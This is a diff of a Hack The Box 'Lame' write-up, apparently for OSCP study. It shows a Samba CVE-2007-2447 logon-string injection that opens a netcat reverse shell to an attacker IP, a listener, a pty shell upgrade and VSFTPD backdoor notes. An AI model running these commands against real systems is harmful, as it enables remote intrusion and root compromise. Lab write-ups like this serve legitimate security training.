@@ -55,9 +55,19 @@ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
 
 ### 🧪 Manual Exploit:
 
+```
+nc -lvnp 443
+```
+
 ```bash
 smbclient //10.10.10.3/tmp
 smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
+```
+
+## 🧙 Shell Cleanup
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 🔥 Got root shell! `uid=0(root)`
@@ -79,19 +89,6 @@ run
 
 ---
 
-## 🔄 Python Exploit
-
-- From [GitHub](https://github.com/borjmz/asymmetric-tools/blob/master/exploits/user_map_script.py):
-    
-
-```bash
-python usermap_script.py 10.10.10.3 139 <your_ip> 443
-```
-
-🎯 Result: root shell on port 443
-
----
-
 ## 🧨 VSFTPD Backdoor Analysis (Beyond Root)
 
 - Trigger **backdoor** via username `USER backdoor:)`
@@ -109,12 +106,6 @@ nc 127.0.0.1 6200  # Success!
 
 ---
 
-## 🧙 Shell Cleanup
-
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-
 ## 🏁 Flags
 
 ```bash
@@ -127,13 +118,9 @@ cat /root/root.txt
 ## 📎 Summary
 
 - ✅ [VSFTPD](https://chatgpt.com/c/ftp): Backdoor blocked by firewall
-    
 - ✅ [Samba](https://chatgpt.com/c/smb): CVE-2007-2447 yields **instant root shell**
-    
 - ✅ [Metasploit](https://metasploit.help.rapid7.com/docs): Supported but not required
-    
 - ✅ [Manual exploitation](https://www.exploit-db.com/exploits/16320): Viable and educational
-    
 
 🎉 Rooted HTB: Lame — Classic, simple, and a good OSCP prep box!
 
